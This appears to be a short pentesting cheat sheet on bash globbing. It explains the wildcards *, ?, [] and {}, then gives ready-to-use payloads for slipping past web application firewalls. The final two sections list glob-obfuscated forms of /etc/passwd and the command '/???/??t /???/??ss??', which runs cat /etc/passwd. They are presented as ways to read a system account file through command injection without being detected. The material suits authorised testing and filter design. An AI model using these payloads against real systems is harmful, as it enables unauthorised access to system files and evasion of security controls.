## Globbing


The `*` serves as a "wild card" for filename expansion.

```bash
/etc/pa*wd    #/etc/passwd
```   

The `?` serves as a single-character "wild card" for filename expansion.

```bash
/b?n/?at      #/bin/cat
```

The `[]` serves to match the character from a range.

```bash
ls -l [a-z]*   #list all files with alphabet in its filename.
```

The `{}` can be used to match filenames with more than one patterns

```bash
ls {*.sh,*.py}   #list all .sh and .py files
```

## Bypass /etc/passwd WAF using globbing

```
/e?c/?asswd
/e*c/*asswd
/??c/?asswd
/??c/?assw?
```


## Bypass "cat /etc/passwd" WAF using globbing

```
/???/??t /???/??ss??
```
